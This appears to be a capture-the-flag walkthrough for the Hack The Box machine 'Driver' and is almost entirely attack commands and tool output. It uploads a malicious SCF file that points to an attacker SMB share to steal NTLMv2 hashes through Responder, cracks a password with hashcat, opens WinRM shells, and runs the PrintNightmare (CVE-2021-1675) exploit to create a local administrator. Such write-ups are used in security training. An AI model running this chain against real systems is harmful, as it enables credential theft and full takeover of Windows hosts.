# Driver

1. Log into Print Server <admin:admin>

2. Startup SMB server
````
responder --lm -v -I tun0
````

3. Upload the malicious file to coordinate the target connecting back with SMB credentials

hash-stealer.scf
````     
[Shell]
Command=2
IconFile=\\10.10.14.221\share\malicious.ico
 
[Taskbar]
Command=ToggleDesktop
````

4. Retrieve the NTLMv2 hash to crack and analyze them
````
# hashid hash
--File 'hash'--
Analyzing 'tony::DRIVER:1255d3ee3e0cc5e6:19E11F033596F9077500C64883CCE0CE:0101000000000000A861735F5708D8019729CD459FF92C0B00000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:582c249800017afd:B2D95C9E9D94FC55A4C32A2424E93813:0101000000000000ADBD4B5E5708D8016DC5FD2CA51D96B500000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:5b6fd10e3315044f:14405515C217CB462001C03D46267539:01010000000000008DBA2F605708D80190236DBE368BF3A600000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:770784c9c8da82c8:DC39FF1CD2379F2A4C74E7C275BD1CB7:01010000000000002CB78C605708D8019D38DED2D83970E800000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:c3c63558d4c966a7:5870331B5D2D7E963055F9A02170599E:0101000000000000AA03145F5708D80133BA82492ED9079400000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:cdc9c2b80235ecf3:737C600F6146919A36B8C54F5CD5250C:01010000000000009E07B75E5708D80134E7D21478E43F8300000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:fcb87ba8bdca87ca:507592685F0D86EF0FFB77112C93F9C4:0101000000000000935DD05F5708D801502F9C7C96F95AF400000000020000000000000000000000'
[+] NetNTLMv2 
--End of file 'hash'--
````

5. Crack the hash
````
# hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating System
````
````
# hashcat -m 5600 -a 0 hash /root/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 5814/5878 MB (2048 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hash' on line 1 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 2 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 3 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 5 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 6 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 7 (tony::...                                ): Token encoding exception
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /root/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 7 secs

TONY::DRIVER:770784c9c8da82c8:dc39ff1cd2379f2a4c74e7c275bd1cb7:01010000000000002cb78c605708d8019d38ded2d83970e800000000020000000000000000000000:liltony
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:770784c9c8da82c8:dc39ff1cd2379f2a4c74e...000000
Time.Started.....: Wed Jan 12 20:40:40 2022 (1 sec)
Time.Estimated...: Wed Jan 12 20:40:41 2022 (0 secs)
Guess.Base.......: File (/root/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   275.7 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 31744/14344385 (0.22%)
Rejected.........: 0/31744 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!!!!! -> 225566

Started: Wed Jan 12 20:39:44 2022
Stopped: Wed Jan 12 20:40:42 2022
````

6. Test the credentials
````
# smbclient -L //DRIVER -U tony -m SMB2
Enter WORKGROUP\tony's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
````

````
# rpcclient -U tony DRIVER                
Enter WORKGROUP\tony's password: 
rpcclient $> srvinfo
        DRIVER         Wk Sv NT             
        platform_id     :       500
        os version      :       10.0
        server type     :       0x1003
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[DefaultAccount] rid:[0x1f7]
user:[Guest] rid:[0x1f5]
user:[tony] rid:[0x3eb]
````

7. Attack (msfconsole version)
````
msf6 auxiliary(scanner/winrm/winrm_cmd) > show options

Module options (auxiliary/scanner/winrm/winrm_cmd):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD       ipconfig /all    yes       The windows command to run
   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentification
   PASSWORD  liltony          yes       The password to authenticate with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    DRIVER           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5985             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   URI       /wsman           yes       The URI of the WinRM service
   USERNAME  tony             yes       The username to authenticate as
   VHOST                      no        HTTP server virtual host

msf6 auxiliary(scanner/winrm/winrm_cmd) > run


Windows IP Configuration

   Host Name . . . . . . . . . . . . : DRIVER
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-27-9E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::18f(Preferred)
   Lease Obtained. . . . . . . . . . : Thursday, January 13, 2022 12:25:07 AM
   Lease Expires . . . . . . . . . . : Thursday, January 13, 2022 1:15:07 AM
   Link-local IPv6 Address . . . . . : fe80::4c36:4532:7be5:7ecd%5(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.11.106(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-71-9A-3A-00-50-56-B9-27-9E
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

Tunnel adapter isatap.{99C52957-7ED3-4943-91B6-CD52EF4D6AFC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
[+] Results saved to /root/.msf4/loot/20220112210701_default_10.10.11.106_winrm.cmd_result_387450.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

````
msf6 auxiliary(scanner/winrm/winrm_cmd) > set CMD dir C:\\Users\\tony\\Desktop\\
CMD => dir C:\Users\tony\Desktop\
msf6 auxiliary(scanner/winrm/winrm_cmd) > run



    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/13/2022  12:25 AM             34 user.txt


[+] Results saved to /root/.msf4/loot/20220112210931_default_10.10.11.106_winrm.cmd_result_636504.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/winrm/winrm_cmd) > set CMD type C:\\Users\\tony\\Desktop\\user.txt
CMD => type C:\Users\tony\Desktop\user.txt
msf6 auxiliary(scanner/winrm/winrm_cmd) > run

0670f60401f62dd13fe3b7c5597ac4a0
[+] Results saved to /root/.msf4/loot/20220112210951_default_10.10.11.106_winrm.cmd_result_585824.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

7. Attack (evil-winrm version)
````
# gem install evil-winrm
````

````
# evil-winrm -i DRIVER -u tony -p liltony

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

cd*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/13/2022  12:25 AM             34 user.txt

*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
0670f60401f62dd13fe3b7c5597ac4a0
*Evil-WinRM* PS C:\Users\tony\Desktop>
````

8. PrivEscalation
````
# git clone https://github.com/calebstewart/CVE-2021-1675
````
````
*Evil-WinRM* PS C:\Users\tony\Documents> upload /root/Desktop/driver/CVE-2021-1675/CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module ./CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser '0xcafe' -NewPassword '0xcafecafe'
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user 0xcafe as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\tony\Documents>
````
````
# evil-winrm -i DRIVER -u 0xcafe -p 0xcafecafe

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\0xcafe\Documents> whoami
driver\0xcafe
*Evil-WinRM* PS C:\Users\0xcafe\Documents> type C:\\Users\\Administrator\\Desktop\\root.txt
1fb10389457b16eecfdc250a7a39ecd7
*Evil-WinRM* PS C:\Users\0xcafe\Documents>
````


[Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
